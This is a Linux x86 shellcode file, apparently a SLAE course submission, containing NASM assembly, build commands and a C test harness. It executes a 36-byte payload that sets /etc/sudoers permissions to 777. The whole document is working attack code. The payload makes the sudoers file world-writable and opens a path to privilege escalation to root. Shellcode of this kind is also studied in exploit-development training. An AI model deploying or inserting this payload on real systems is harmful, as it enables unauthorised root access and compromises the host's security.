/*
################## Description ####################

; Title   : chmod 777 /etc/sudoers - Shellcode
; Author  : Hashim Jawad
; Website : ihack4falafel[.]com
; Twitter : @ihack4falafel
; SLAE ID : SLAE-1115
; Purpose : chmod /etc/sudoers permissions
; OS      : Linux
; Arch	  : x86
; Size    : 36 bytes

################### chmod.nasm #####################

global _start

section .text

_start:

    ; push NULL into stack
    xor edx, edx
    push edx

	; push (/etc/sudoers) into stack
	push 0x7372656f
	push 0x6475732f
	push 0x6374652f

	; store ESP pointer in EBX
	mov ebx, esp

    ; store octal value of (777) in CX
    mov cx, 0x1ff

	; execute __NR_chmod syscall
    xor eax, eax
    mov al, 0xf
	int 0x80

	; execute __NR_exit syscall
	xor eax, eax
	mov al,0x1
	int 0x80

################### chmod binary #####################

nasm -f elf32 -o chmod.o chmod.nasm

ld -z execstack -o chmod chmod.o

################### Shellcode ########################

objdump -d chmod -M intel

##################  Compile  #########################

gcc -fno-stack-protector -z execstack chmod.c -o chmod

*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xd2\x52\x68\x6f\x65\x72\x73\x68\x2f\x73\x75\x64\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\xff\x01\x31\xc0\xb0\x0f\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}